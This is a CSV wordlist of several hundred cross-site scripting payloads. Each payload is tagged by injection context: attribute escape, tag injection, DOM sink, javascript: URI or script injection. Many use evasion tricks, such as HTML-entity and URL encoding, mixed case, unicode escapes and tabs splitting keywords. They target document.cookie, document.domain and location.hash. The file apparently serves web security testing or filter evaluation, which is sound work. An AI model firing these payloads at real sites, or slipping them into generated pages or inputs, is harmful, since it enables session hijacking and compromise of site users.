payload,context
' onclick=confirm(docum&#101;nt.dom&#97;in) ',attribute_escape
%22><svg ontoggle=prompt(document.cookie)>,tag_injection
"eval(%22prompt(String.fromCharCode(88,83,83))%22)",dom_sink
""" oNmoUseEntEr=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape
"""><svg onmouseover=\u0061lert('XSS')>",tag_injection
""" onmouseenter=\u0061lert(location.hash) """,attribute_escape
"<img onload=alert(String.fromCharCode(88,83,83))/>",tag_injection
<svg onbegin=console.log('XSS')/>,tag_injection
""" onclick=confirm(document.domain) """,attribute_escape
%27 onerror=confirm(1) %27,attribute_escape
"<svg ontoggl&#101;=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
"""%3E%3Csvg onload=prompt(location.hash)%3E",tag_injection
%22 onerror=console.log(document.cookie) %22,attribute_escape
"<svg ontoggl&#101;=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
""" onerror=confirm(document.domain) """,attribute_escape
' oNbeGin=coNfiRm(DocUmeNt.DomAin) ',attribute_escape
<img onload=prompt(1)/>,tag_injection
"%3Csvg onerror=alert(String.fromCharCode(88,83,83))/%3E",tag_injection
""" ontoggl&#101;=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape
%3Csvg onerror=prompt(document.domain)%3E,tag_injection
' onfocus=confirm(docum&#101;nt.dom&#97;in) ',attribute_escape
"""><Svg onFocUs=ConSolE.lOg(DocUmeNt.CooKie)>",tag_injection
<svG oNbeGin=coNsoLe.Log(1)/>,tag_injection
%3Csvg onclick=confirm(location.hash)/%3E,tag_injection
""" oNloAd=ConSolE.lOg(DocUmeNt.CooKie) """,attribute_escape
%22 onfocus=console.log(location.hash) %22,attribute_escape
%27 onerror=console.log(document.cookie) %27,attribute_escape
"document.write(""%3Cimg src=x onerror=prompt(1)%3E"")",dom_sink
<svg onload=alert(%27XSS%27)>,tag_injection
JavAscRipT:vOid(coNfiRm(1)),js_uri
"""><svg onload=prompt(document.domain)>",tag_injection
"""><svg onbegin=\u0061lert(location.hash)>",tag_injection
""" oNerRor=coNsoLe.Log(1) """,attribute_escape
<svg ontoggl&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
%3Cimg onload=alert(document.cookie)/%3E,tag_injection
<svG oNmoUseOveR=cOnfIrm(doCumEnt.doMaiN)/>,tag_injection
"""><Svg onMouSeeNteR=aLerT(dOcuMenT.cOokIe)>",tag_injection
"<svg onmouseover=confirm(String.fromCharCode(88,83,83))/>",tag_injection
<svg onclick=\u0061lert(1)/>,tag_injection
' oNtoGglE=pRomPt(LocAtiOn.HasH) ',attribute_escape
"""><svg onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt('XSS')>",tag_injection
' onmouseover=prompt(location.hash) ',attribute_escape
<svg onmouseenter=console.log(document.cookie)>,tag_injection
"""><Svg onCliCk=ConSolE.lOg(LocAtiOn.HasH)>",tag_injection
' onb&#101;gin=confirm(docum&#101;nt.cooki&#101;) ',attribute_escape
document.write(%22<img src=x onerror=console.log(document.domain)>%22),dom_sink
"SetTimEouT(""ConFirM('XSS')"",0)",dom_sink
"""><img onlo&#97;d=prompt('XSS')>",tag_injection
"""><svg onb&#101;gin=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>",tag_injection
""" oNtoGglE=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
%22><svg ontoggle=alert(document.domain)>,tag_injection
"""%3E%3Csvg onload=alert(String.fromCharCode(88,83,83))%3E",tag_injection
"""><svg onfocus=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
' oNfoCus=alErt('XSS') ',attribute_escape
<script>/x/console.log(1)</script>,script_injection
' onmouseenter=prompt(document.cookie) ',attribute_escape
"""><Svg onLoaD=aLerT(STriNg.FroMChArCOde(88,83,83))>",tag_injection
javascr	ipt:prompt('XSS'),js_uri
' onbegin=prompt(document.domain) ',attribute_escape
%22 onmouseenter=prompt(%27XSS%27) %22,attribute_escape
"""><svg onerror=console.log(location.hash)>",tag_injection
<svg ontoggl&#101;=consol&#101;.log('XSS')/>,tag_injection
%22><svg onmouseenter=confirm(document.domain)>,tag_injection
""" onload=\u0061lert('XSS') """,attribute_escape
""" onmous&#101;ov&#101;r=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape
"""><svg onerror=alert('XSS')>",tag_injection
' ontoggle=confirm(location.hash) ',attribute_escape
"javascr	ipt:confirm(String.fromCharCode(88,83,83))",js_uri
document.write(%22<img src=x onerror=console.log(%27XSS%27)>%22),dom_sink
""" onerror=console.log(document.domain) """,attribute_escape
"""><svg on&#101;rror=consol&#101;.log(docum&#101;nt.cooki&#101;)>",tag_injection
<svg onmous&#101;ov&#101;r=prompt(1)/>,tag_injection
' oNmoUseEntEr=ProMpt(1) ',attribute_escape
%3Cscript%3Eprompt`'XSS'`%3C/script%3E,script_injection
<svg onfocus=confirm(document.domain)>,tag_injection
<script>prompt`'XSS'`</script>,script_injection
<svG oNloAd=ConFirM('XSS')>,tag_injection
"%27 onbegin=confirm(String.fromCharCode(88,83,83)) %27",attribute_escape
"""><Svg onFocUs=ProMpt(1)>",tag_injection
<svG oNclIck=alErt(doCumEnt.doMaiN)>,tag_injection
""" oNfoCus=alErt(1) auTofOcuS=""",attribute_escape
%3Csvg onclick=prompt('XSS')%3E,tag_injection
"""><svg onfocus=alert(document.domain)>",tag_injection
""" onmouseover=alert(document.domain) """,attribute_escape
%3Csvg onbegin=confirm('XSS')%3E,tag_injection
"<script>//\u0061lert(String.fromCharCode(88,83,83))</script>",script_injection
""" on&#101;rror=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
' oNmoUseOveR=aLerT(lOcaTioN.hAsh) ',attribute_escape
' onfocus=prompt(location.hash) ',attribute_escape
<svg onclick=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
<scr	ipt>/*/confirm(document.domain)</scr	ipt>,script_injection
<img onload=\u0061lert('XSS')>,tag_injection
"%27 ontoggle=console.log(String.fromCharCode(88,83,83)) %27",attribute_escape
"%22><svg onfocus=alert(String.fromCharCode(88,83,83))>",tag_injection
%3Csvg onfocus=confirm(1)/%3E,tag_injection
<script>/*/consol&#101;.log(1)</script>,script_injection
"""><img onload=prompt(1)>",tag_injection
""" oNmoUseEntEr=ProMpt(doCumEnt.doMaiN) """,attribute_escape
<scr	ipt>prompt(location.hash)</scr	ipt>,script_injection
<svG oNmoUseEntEr=ConSolE.lOg(1)/>,tag_injection
<svg onmouseenter=console.log(location.hash)>,tag_injection
<svg on&#101;rror=confirm(1)>,tag_injection
javascr	ipt:void(prompt('XSS')),js_uri
<scr	ipt>console.log(document.domain)</scr	ipt>,script_injection
""" oNloAd=AleRt(DocUmeNt.DomAin) """,attribute_escape
<svg onlo&#97;d=&#97;l&#101;rt('XSS')>,tag_injection
"<svg onmouseenter=confirm(String.fromCharCode(88,83,83))>",tag_injection
%22><svg onload=prompt(document.domain)>,tag_injection
%22><svg onload=prompt(document.cookie)>,tag_injection
""" onmouseenter=\u0061lert(document.domain) """,attribute_escape
javascript:void(prompt(location.hash)),js_uri
%3Cscript%3Econsole.log('XSS')%3C/script%3E,script_injection
""" onload=console.log(String.fromCharCode(88,83,83)) """,attribute_escape
' onmouseenter=\u0061lert(document.domain) ',attribute_escape
<svg on&#101;rror=confirm('XSS')>,tag_injection
<svG oNerRor=coNfiRm(DocUmeNt.CooKie)/>,tag_injection
"JavAscRipT:vOid(alErt(StRinG.fRomChaRCoDe(88,83,83)))",js_uri
"%22><svg onfocus=prompt(String.fromCharCode(88,83,83))>",tag_injection
"""><svg onbegin=\u0061lert(1)>",tag_injection
"%3Csvg onerror=prompt(String.fromCharCode(88,83,83))/%3E",tag_injection
"setTimeout(%22console.log(1)%22,0)",dom_sink
"<svg onmouseenter=prompt(String.fromCharCode(88,83,83))>",tag_injection
"' onmous&#101;ov&#101;r=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
"<svg onload=\u0061lert(String.fromCharCode(88,83,83))/>",tag_injection
<svg onmous&#101;&#101;nt&#101;r=confirm(loc&#97;tion.h&#97;sh)>,tag_injection
<scr	ipt>/x/console.log(1)</scr	ipt>,script_injection
<script>/*/console.log(1)</script>,script_injection
""" oNclIck=coNsoLe.Log(doCumEnt.doMaiN) """,attribute_escape
"""><Svg onBegIn=ConFirM(1)>",tag_injection
<svG oNloAd=AleRt(DocUmeNt.DomAin)>,tag_injection
""" onerror=\u0061lert('XSS') """,attribute_escape
<script>alert`'XSS'`</script>,script_injection
"%3Csvg onclick=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
"eval(""prompt(1)"")",dom_sink
%27 onload=console.log(document.cookie) %27,attribute_escape
%3Csvg onload=alert(1)/%3E,tag_injection
<script>consol&#101;.log`'XSS'`</script>,script_injection
<svG oNclIck=coNsoLe.Log(doCumEnt.coOkiE)/>,tag_injection
<script>/*/confirm(1)</script>,script_injection
<svg onmous&#101;ov&#101;r=confirm('XSS')>,tag_injection
"' oNbeGin=prOmpT(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
"SetTimEouT(""ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))"",0)",dom_sink
javascript:void(alert('XSS')),js_uri
"<svg onerror=prompt(String.fromCharCode(88,83,83))>",tag_injection
<svG oNloAd=AleRt(1)/>,tag_injection
<svg ontoggle=alert(%27XSS%27)/>,tag_injection
%22><svg onclick=prompt(location.hash)>,tag_injection
"""><Svg onTogGle=prOmpT('XSS')>",tag_injection
<svg onmous&#101;ov&#101;r=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
%27 onmouseenter=prompt(document.cookie) %27,attribute_escape
"""><svg onmous&#101;&#101;nt&#101;r=consol&#101;.log('XSS')>",tag_injection
<svg on&#101;rror=prompt(loc&#97;tion.h&#97;sh)/>,tag_injection
%27 onload=alert(document.domain) %27,attribute_escape
<script>consol&#101;.log(1)</script>,script_injection
"setTimeout(""confirm(document.cookie)"",0)",dom_sink
"&#101;v&#97;l(""&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))"")",dom_sink
<svg onerror=\u0061lert(document.domain)>,tag_injection
"' onclick=\u0061lert(String.fromCharCode(88,83,83)) '",attribute_escape
eval(%22confirm(location.hash)%22),dom_sink
"""><svg onmouseenter=alert(String.fromCharCode(88,83,83))>",tag_injection
' onclick=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape
""" onmous&#101;&#101;nt&#101;r=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape
%3Csvg onfocus=console.log(1)/%3E,tag_injection
' ontoggle=\u0061lert(document.cookie) ',attribute_escape
<scr	ipt>//console.log(document.domain)</scr	ipt>,script_injection
""" ontoggl&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
<script>//consol&#101;.log(loc&#97;tion.h&#97;sh)</script>,script_injection
""" oNtoGglE=cOnsOle.loG(dOcuMenT.dOmaIn) """,attribute_escape
""" onmous&#101;ov&#101;r=&#97;l&#101;rt('XSS') """,attribute_escape
%22><svg onbegin=confirm(document.cookie)>,tag_injection
%3Csvg onload=prompt(document.cookie)%3E,tag_injection
' on&#101;rror=&#97;l&#101;rt(1) ',attribute_escape
%3Cscript%3Ealert`1`%3C/script%3E,script_injection
' onb&#101;gin=confirm(docum&#101;nt.dom&#97;in) ',attribute_escape
%3Csvg ontoggle=prompt(document.domain)/%3E,tag_injection
' onclick=prompt(location.hash) ',attribute_escape
' oNclIck=alErt(1) ',attribute_escape
<svg onmous&#101;ov&#101;r=consol&#101;.log(docum&#101;nt.dom&#97;in)/>,tag_injection
"setTimeout(%22alert(document.domain)%22,0)",dom_sink
<svG oNbeGin=prOmpT('XSS')/>,tag_injection
<svg onmouseenter=prompt(location.hash)/>,tag_injection
"""%3E%3Csvg onfocus=console.log('XSS')%3E",tag_injection
"%27 onload=alert(String.fromCharCode(88,83,83)) %27",attribute_escape
<svg onlo&#97;d=prompt(docum&#101;nt.cooki&#101;)>,tag_injection
""" oNtoGglE=aLerT(dOcuMenT.cOokIe) """,attribute_escape
"""><Svg onBegIn=ConSolE.lOg('XSS')>",tag_injection
"""><svg ontoggl&#101;=prompt(docum&#101;nt.cooki&#101;)>",tag_injection
""" ontoggle=prompt(document.domain) """,attribute_escape
"""><svg onfocus=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection
<script>/*/prompt(document.cookie)</script>,script_injection
<svg onmouseover=\u0061lert(document.domain)/>,tag_injection
' onbegin=prompt('XSS') ',attribute_escape
<scRipT>cOnfIrm`doCumEnt.coOkiE`</scRipT>,script_injection
<img onlo&#97;d=&#97;l&#101;rt(1)/>,tag_injection
""" onmouseenter=\u0061lert(document.cookie) """,attribute_escape
""" oNfoCus=prOmpT('XSS') """,attribute_escape
"<svg onlo&#97;d=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"""%3E%3Csvg onclick=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
"""%3E%3Cimg onload=alert(document.domain)%3E",tag_injection
%3Csvg onfocus=alert('XSS')/%3E,tag_injection
<svg onerror=prompt(%27XSS%27)>,tag_injection
"""><svg ontoggle=confirm(location.hash)>",tag_injection
<svg onfocus=alert(1)/>,tag_injection
%22><svg onfocus=prompt(location.hash)>,tag_injection
"""><svg onfocus=console.log('XSS')>",tag_injection
<svg onmous&#101;ov&#101;r=prompt(1)>,tag_injection
' onerror=prompt(document.cookie) ',attribute_escape
<svG oNfoCus=coNsoLe.Log(1)/>,tag_injection
%3Csvg onmouseover=console.log('XSS')%3E,tag_injection
<scr	ipt>confirm(location.hash)</scr	ipt>,script_injection
<svg onmouseenter=prompt('XSS')>,tag_injection
<script>alert(location.hash)</script>,script_injection
<svg onb&#101;gin=prompt(docum&#101;nt.dom&#97;in)/>,tag_injection
<scr	ipt>//prompt(location.hash)</scr	ipt>,script_injection
"""><Svg onErrOr=ProMpt(doCumEnt.coOkiE)>",tag_injection
""" oNclIck=prOmpT(1) """,attribute_escape
"%3Cscript%3E/*/confirm(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
"setTimeout(%22prompt(1)%22,0)",dom_sink
"s&#101;tTim&#101;out(""consol&#101;.log(docum&#101;nt.dom&#97;in)"",0)",dom_sink
<svg onclick=console.log(1)/>,tag_injection
%27 onfocus=alert(document.domain) %27,attribute_escape
<svg onb&#101;gin=consol&#101;.log(1)>,tag_injection
<scr	ipt>console.log`document.cookie`</scr	ipt>,script_injection
"""%3E%3Csvg onmouseover=console.log(1)%3E",tag_injection
' onmouseover=prompt('XSS') ',attribute_escape
<img onload=\u0061lert(document.cookie)>,tag_injection
<svg onbegin=confirm(document.cookie)/>,tag_injection
"%3Cscript%3Econsole.log`String.fromCharCode(88,83,83)`%3C/script%3E",script_injection
"<svg onb&#101;gin=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
""" oNloAd=AleRt('XSS') """,attribute_escape
<scr	ipt>/*/confirm(document.cookie)</scr	ipt>,script_injection
"""><Svg onFocUs=ConFirM(dOcuMenT.cOokIe)>",tag_injection
""" onfocus=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
<svg onmouseover=prompt(location.hash)/>,tag_injection
<scRipT>pRomPt`LocAtiOn.HasH`</scRipT>,script_injection
"""%3E%3Csvg ontoggle=alert(1)%3E",tag_injection
' oNfoCus=prOmpT(lOcaTioN.hAsh) ',attribute_escape
javascript:void(console.log(location.hash)),js_uri
%3Csvg onbegin=confirm('XSS')/%3E,tag_injection
%22 ontoggle=alert(1) %22,attribute_escape
<svG oNmoUseEntEr=ConSolE.lOg(DocUmeNt.CooKie)>,tag_injection
"%22 ontoggle=alert(String.fromCharCode(88,83,83)) %22",attribute_escape
<svg onmouseover=confirm(document.cookie)>,tag_injection
' oNtoGglE=cOnfIrm(loCatIon.haSh) ',attribute_escape
' oNerRor=prOmpT(dOcuMenT.dOmaIn) ',attribute_escape
""" onmouseenter=\u0061lert('XSS') """,attribute_escape
<svg onlo&#97;d=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
"""><svg onmous&#101;ov&#101;r=consol&#101;.log(loc&#97;tion.h&#97;sh)>",tag_injection
"s&#101;tTim&#101;out(""consol&#101;.log('XSS')"",0)",dom_sink
javascript:confirm(document.cookie),js_uri
<svg onmous&#101;ov&#101;r=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection
<svg ontoggle=alert('XSS')/>,tag_injection
""" onmouseover=console.log(document.domain) """,attribute_escape
<svg onmous&#101;ov&#101;r=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)/>,tag_injection
"<svg ontoggle=confirm(String.fromCharCode(88,83,83))/>",tag_injection
<svG oNmoUseOveR=pRomPt(DocUmeNt.CooKie)/>,tag_injection
""" onfocus=consol&#101;.log(1) &#97;utofocus=""",attribute_escape
%3Cscript%3E/*/prompt(1)%3C/script%3E,script_injection
%22 onfocus=alert(location.hash) autofocus=%22,attribute_escape
"%3Csvg onfocus=prompt(String.fromCharCode(88,83,83))/%3E",tag_injection
"""><svg onmouseenter=confirm('XSS')>",tag_injection
%3Csvg onmouseenter=alert(document.cookie)%3E,tag_injection
' onfocus=consol&#101;.log(docum&#101;nt.cooki&#101;) ',attribute_escape
%3Csvg onerror=prompt(document.cookie)%3E,tag_injection
"""><svg onclick=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
JavAscRipT:vOid(coNfiRm('XSS')),js_uri
<svg onclick=console.log('XSS')/>,tag_injection
<scRipT>/X/pRomPt('XSS')</sCriPt>,script_injection
<script>/x/&#97;l&#101;rt(1)</script>,script_injection
j&#97;v&#97;script:void(consol&#101;.log('XSS')),js_uri
"<svg onmouseover=console.log(String.fromCharCode(88,83,83))>",tag_injection
"""><svg onfocus=consol&#101;.log('XSS')>",tag_injection
""" ontoggle=\u0061lert('XSS') """,attribute_escape
<script>prompt(%27XSS%27)</script>,script_injection
"<scr	ipt>/*/alert(String.fromCharCode(88,83,83))</scr	ipt>",script_injection
<script>alert`%27XSS%27`</script>,script_injection
"s&#101;tTim&#101;out(""consol&#101;.log(docum&#101;nt.cooki&#101;)"",0)",dom_sink
""" onbegin=confirm(document.cookie) """,attribute_escape
"""><Svg onCliCk=AleRt(DocUmeNt.CooKie)>",tag_injection
%3Cscript%3E//alert(document.cookie)%3C/script%3E,script_injection
""" onclick=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
%27 onfocus=confirm(document.domain) %27,attribute_escape
<scRipT>/X/cOnsOle.loG('XSS')</scRipT>,script_injection
<scr	ipt>alert`document.domain`</scr	ipt>,script_injection
""" oNmoUseOveR=aLerT(1) """,attribute_escape
%22><svg onmouseenter=confirm(location.hash)>,tag_injection
%22><svg onerror=alert(%27XSS%27)>,tag_injection
"s&#101;tTim&#101;out(""prompt(docum&#101;nt.cooki&#101;)"",0)",dom_sink
<scRipT>/*/pRomPt(1)</scRipT>,script_injection
j&#97;v&#97;script:prompt(docum&#101;nt.cooki&#101;),js_uri
document.write(%22<img src=x onerror=prompt(1)>%22),dom_sink
<svg on&#101;rror=prompt('XSS')>,tag_injection
' onclick=alert(1) ',attribute_escape
<svG oNmoUseEntEr=ConFirM(lOcaTioN.hAsh)>,tag_injection
""" onclick=consol&#101;.log(docum&#101;nt.cooki&#101;) """,attribute_escape
"<svG oNloAd=AleRt(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
"""%3E%3Csvg onerror=alert(1)%3E",tag_injection
%22 onmouseover=prompt(%27XSS%27) %22,attribute_escape
<svG oNmoUseEntEr=AleRt('XSS')/>,tag_injection
%27 onfocus=prompt(location.hash) %27,attribute_escape
<svg onclick=confirm(loc&#97;tion.h&#97;sh)/>,tag_injection
""" onbegin=console.log('XSS') """,attribute_escape
""" oNerRor=alErt(doCumEnt.doMaiN) """,attribute_escape
""" oNbeGin=coNsoLe.Log(doCumEnt.coOkiE) """,attribute_escape
"""><Svg onFocUs=AleRt(DocUmeNt.CooKie)>",tag_injection
"""><svg onfocus=consol&#101;.log(docum&#101;nt.cooki&#101;)>",tag_injection
"""><svg onlo&#97;d=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"%22><svg onerror=alert(String.fromCharCode(88,83,83))>",tag_injection
<svG oNtoGglE=aLerT(1)/>,tag_injection
%3Csvg onmouseenter=alert('XSS')/%3E,tag_injection
<svG oNloAd=AleRt(LocAtiOn.HasH)>,tag_injection
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=prompt(docum&#101;nt.cooki&#101;)>"")",dom_sink
"""><svg onclick=prompt(location.hash)>",tag_injection
<svg on&#101;rror=consol&#101;.log(loc&#97;tion.h&#97;sh)/>,tag_injection
j&#97;vascript:alert(location.hash),js_uri
javascript:void(confirm(location.hash)),js_uri
<script>/x/confirm(docum&#101;nt.cooki&#101;)</script>,script_injection
<svG oNfoCus=alErt(doCumEnt.doMaiN)/>,tag_injection
%22 onmouseenter=confirm(%27XSS%27) %22,attribute_escape
<svg onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt('XSS')>,tag_injection
"""><svg onfocus=alert(location.hash)>",tag_injection
' onlo&#97;d=confirm(docum&#101;nt.cooki&#101;) ',attribute_escape
"javascr	ipt:void(confirm(String.fromCharCode(88,83,83)))",js_uri
""" onclick=prompt(docum&#101;nt.cooki&#101;) """,attribute_escape
<scr	ipt>prompt('XSS')</scr	ipt>,script_injection
<svg onmouseover=console.log(location.hash)>,tag_injection
"""><svg onlo&#97;d=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
<scRipT>/X/aLerT(dOcuMenT.cOokIe)</sCriPt>,script_injection
""" oNmoUseEntEr=ConSolE.lOg(DocUmeNt.DomAin) """,attribute_escape
' onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) ',attribute_escape
""" ontoggle=\u0061lert(location.hash) """,attribute_escape
